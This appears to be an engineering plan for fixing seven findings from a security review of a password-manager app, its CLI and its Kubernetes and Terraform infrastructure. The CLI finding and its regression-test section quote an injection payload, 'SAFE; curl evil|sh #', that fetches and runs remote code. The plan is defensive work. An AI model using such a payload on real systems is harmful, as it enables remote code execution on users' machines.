# Plan: 2026-07 Triangulated External Security Review Follow-up

Date: 2026-07-23
Branch: `fix/security-review-2026-07-followup`
Source: `/triangulate` verification of a 9-item external security review (all 7 actionable
findings confirmed at source level; 2 additional class members surfaced by triangulation).

## Project context

- App: Next.js 16 + TypeScript, Prisma 7, PostgreSQL. Full CI (vitest, next build, lint, integration).
- CLI: separate `cli/` package (TypeScript, ESM, `.js` relative imports; `cd cli && npm run build`).
- Test infra: present (vitest for app + CLI). Test additions ARE expected.

## Findings & fixes (priority order)

### F1 — High: CLI arbitrary command execution via unvalidated env-var NAME

**Root cause**: `cli/src/lib/secrets-config.ts` validates `entry`/`field` values but never the
config KEY (`envName`). `cli/src/commands/env.ts` emits `export ${k}=${shellEscape(v)}` (shell)
and `${k}=${shellEscape(v)}` (dotenv) — only the VALUE is escaped; the KEY is raw. Default format
is `shell` (`cli/src/index.ts`), and `eval $(passwd-sso env)` is the documented usage
(`docs/archive/review/batch-f-plan.md`). A key like `SAFE; curl evil|sh #` → RCE when eval'd/sourced.

**Triangulation additions**:
- `--format dotenv` is a SECOND injectable sink (missed by original review) — consumed via `set -a; source`.
- `run` command is immune (shell-free `spawn`). `field`/`entry` are object-lookup / URL-encoded, not shell sinks.
- `BLOCKED_KEYS` is exact-match — does NOT block an injection payload key; not a mitigation.

**Fix (choke-point, covers all formats)**: validate the key in `loadSecretsConfig`
(`secrets-config.ts`) at load time — the single point through which both `env` and `run` flow.
- Regex: `^[A-Za-z_][A-Za-z0-9_]*$` (POSIX portable env-var name).
  - Security-review note: the JS `$` (no `m` flag) matches only end-of-input — it does NOT match
    before a trailing `\n` (unlike PCRE/Python). No lookahead hardening needed; the class covers it.
- Length cap: reject the config KEY when longer than 128 chars (name, not value).
- Throw a clear `Error` NAMING the offending constraint but NOT echoing the raw key payload
  (mirror the F30/S22 no-echo pattern used in worker-env code).
- This is a NEW validation utility; no existing helper in `cli/src/lib` (verified).

**Test placement (Testing-expert finding — MANDATORY)**: the regression test goes in
`cli/src/__tests__/unit/secrets-config.test.ts` (real loader). `env.test.ts` fully mocks
`loadSecretsConfig`, so an injection test there passes VACUOUSLY (green with or without the fix) —
do NOT put the injection regression there. At the choke point the shell-vs-dotenv distinction is
moot (both flow through the loader). Required assertions: (a) `loadSecretsConfig` throws on key
`SAFE; curl evil|sh #`, (b) the thrown message does NOT contain the payload verbatim, (c) length-cap
(>128-char key) throws, (d) boundary keys: leading digit `1FOO`, hyphen `A-B`, empty key all throw;
a valid key `MY_SECRET` passes. This is genuinely red-before (loader currently never checks the key).

**Files**: `cli/src/lib/secrets-config.ts`, `cli/src/__tests__/unit/secrets-config.test.ts`.

### F2 — Medium: Workers require broad app DATABASE_URL alongside least-priv worker URL

**Root cause**: `DATABASE_URL: nonEmpty` (required) in `src/lib/env-schema.ts:105`. Both workers
`.pick({ DATABASE_URL: true, ... })` from `envObject` and hard-require it to boot, even though the
connection prefers `OUTBOX_WORKER_DATABASE_URL ?? DATABASE_URL` (resp. `RETENTION_GC_DATABASE_URL`).
When the dedicated URL is set (the k8s production case), the broad app credential is injected but
NEVER used — needless privilege exposure on worker-compromise.

**Fix**: make the worker's picked schema treat `DATABASE_URL` as optional and require that AT LEAST
ONE of {dedicated URL, DATABASE_URL} is present, via a `.refine()` on the picked worker schema (NOT
on the shared app schema — the app genuinely requires DATABASE_URL). Then remove the `DATABASE_URL`
env entry from both k8s worker manifests so only the least-priv URL is injected in production.

**Constraint**: must not change app boot behavior — `DATABASE_URL` stays required in the app path.
Zod 4: `.pick()` on `envObject` (raw ZodObject — NOT the refined `envSchema`, F16), make
`DATABASE_URL` optional via `.partial({DATABASE_URL:true})` or re-declare, then `.refine()` for
at-least-one-of. Verify `--validate-env-only` still passes with only the dedicated URL set.

**Refine path pinning (Testing-expert finding — MANDATORY)**: the `.refine()` MUST pass
`path: ["DATABASE_URL"]` in its options. A bare `.refine()` emits an issue with empty `path` (`[]`),
which breaks the EXISTING negative tests that assert `issue.path.join(".") === "DATABASE_URL"`:
- `scripts/__tests__/audit-outbox-worker-env.test.mjs` ("exits 1 when DATABASE_URL missing")
- `scripts/__tests__/retention-gc-worker-env.test.mjs` (same)
These two existing tests MUST be updated to assert the new refine-failure path (neither URL set), AND
a NEW positive test added: worker exits 0 with ONLY the dedicated URL set and `DATABASE_URL` UNSET
(currently untested — existing tests always pass a valid `DATABASE_URL`).

**Least-privilege verification (Security-expert finding)**: removing `DATABASE_URL` from the manifest
is only meaningful if `RETENTION_GC_DATABASE_URL` / `OUTBOX_WORKER_DATABASE_URL` connect as the SCOPED
DB roles (`passwd_retention_gc_worker` / `passwd_outbox_worker`), not the app role. Verify in Phase 2
that the k8s secret values point at the scoped roles; otherwise the reduction is cosmetic.

**Files**: `scripts/audit-outbox-worker.ts`, `scripts/retention-gc-worker.ts`,
`scripts/__tests__/audit-outbox-worker-env.test.mjs`, `scripts/__tests__/retention-gc-worker-env.test.mjs`,
`infra/k8s/audit-outbox-worker.yaml`, `infra/k8s/retention-gc-worker.yaml`.

### F5 — Medium: k8s workers missing Pod/container securityContext

**Fix**: add to both worker manifests (pod + container level):
`runAsNonRoot: true`, fixed non-root `runAsUser`/`runAsGroup`, `allowPrivilegeEscalation: false`,
`capabilities.drop: [ALL]`, `readOnlyRootFilesystem: true`, `seccompProfile: RuntimeDefault`,
`automountServiceAccountToken: false`.

**Constraint**: `readOnlyRootFilesystem: true` may need a writable `emptyDir` mount for `/tmp` if
the Node runtime writes there. Verify against the Dockerfile `USER`/workdir; add `emptyDir` volume
only if required.

**Files**: `infra/k8s/audit-outbox-worker.yaml`, `infra/k8s/retention-gc-worker.yaml`.

### F6 — Low: audit-outbox-worker livenessProbe is tautological

**Triangulation**: SCOPE CORRECTED — only `audit-outbox-worker.yaml` is affected.
`retention-gc-worker.yaml` ALREADY uses `--validate-env-only` real probes. The audit worker also has
a `--validate-env-only` path in `audit-outbox-worker.ts` — just wire the manifest to it (match the
retention worker).

**Fix**: replace `["node","-e","process.exit(0)"]` in liveness/startup probes with
`["node","dist/audit-outbox-worker.js","--validate-env-only"]`.

**Files**: `infra/k8s/audit-outbox-worker.yaml`.

### F4 — Medium: mutable image tags (`:latest` + ECR MUTABLE)

**Fix**: set `image_tag_mutability = "IMMUTABLE"` on both ECR repos (`ecr.tf`). Document
digest-pinning in the terraform README (replace `:latest` guidance with digest/version pinning).
k8s `:latest` pins are documented as requiring digest substitution at deploy time (leave a comment;
actual digest is deploy-env-specific, not committable).

**Constraint (pre-1.0 wording)**: this is infra hardening, not a breaking change. Verify IMMUTABLE
does not break the documented build/push flow — the README `docker push :latest` flow WILL fail on
the 2nd push under IMMUTABLE (`ImageTagAlreadyExistsException`); update it to push immutable
version/digest tags.

**Lifecycle + third-party consistency (Functionality-expert finding)**: `ecr.tf` lifecycle rules use
`tagPrefixList = ["latest","v"]` with keep-last-10. Reconcile this with the immutable tag scheme the
README adopts (SHA tags won't match `v`-prefix → images never expire). The jackson image is
third-party (`boxyhq/jackson:latest`, no local version SSOT) — the README must instruct pinning to a
specific upstream boxyhq release tag/digest, not just "use a version tag."

**Files**: `infra/terraform/ecr.tf`, `infra/terraform/README.md`, k8s manifests (comment only).

### F3 — Medium: Terraform state stores prod secrets plaintext

**Fix**: this is a deployment-process finding, not a code bug. Remediate by (a) documenting in
`infra/terraform/README.md` that secret VALUES must not be committed to tfvars / must be injected
out-of-band, and (b) making the S3 remote backend with encryption the DOCUMENTED default (uncomment
guidance in `backend.tf` with encryption + versioning + strict IAM notes). Do NOT restructure the
Terraform to fully externalize secret creation in this PR unless low-risk — assess during Phase 2;
if it requires a data-source rework, document the limitation and scope it as a follow-up with a full
Anti-Deferral entry.

**Files**: `infra/terraform/README.md`, `infra/terraform/backend.tf` (docs/guidance).

### F7 — Low: gitleaks allowlists all of `docs/**`

**Fix**: narrow the `docs/` path allowlist to the specific sample-asset files that hold non-secret
test vectors (`docs/assets/passwd-sso.json`, `docs/assets/passwd-sso.csv`) rather than the whole tree.
Verified: no live secret currently under docs/ (only labeled sample keys).

**Files**: `.gitleaks.toml`.

## Implementation Checklist (cross-check against diff in Phase 3)

- [ ] `cli/src/lib/secrets-config.ts` — key validation (regex + length cap)
- [ ] `cli/src/__tests__/unit/secrets-config.test.ts` — malicious-key rejection regression tests
- [ ] `cli/src/__tests__/unit/env.test.ts` — shell AND dotenv format injection regression tests
- [ ] `scripts/audit-outbox-worker.ts` — DATABASE_URL optional + at-least-one refine
- [ ] `scripts/retention-gc-worker.ts` — same
- [ ] `scripts/__tests__/*worker-env*` — worker boots with only dedicated URL
- [ ] `infra/k8s/audit-outbox-worker.yaml` — remove DATABASE_URL, add securityContext, real probe
- [ ] `infra/k8s/retention-gc-worker.yaml` — remove DATABASE_URL, add securityContext
- [ ] `infra/terraform/ecr.tf` — IMMUTABLE
- [ ] `infra/terraform/README.md` — digest pinning + secret-injection guidance
- [ ] `infra/terraform/backend.tf` — encrypted remote backend as documented default
- [ ] `.gitleaks.toml` — narrow docs allowlist

## Out of scope / deferred

- F3 full Terraform secret-externalization rework (assess in Phase 2; may defer with Anti-Deferral entry).
- Provenance/signature verification at deploy (F4 mentions cosign/provenance) — infra roadmap, not this PR.

## Verification environment constraints

- k8s manifest changes cannot be applied to a live cluster in this environment — validated by
  `kubectl --dry-run=client` / yaml lint only (no live rollout). Documented limit for Phase 3.
- Terraform changes validated by `terraform validate`/`fmt` if available; no `apply`.
- CLI + app: full `vitest run` + `next build` + CLI `npm run build && npm test` are runnable locally.
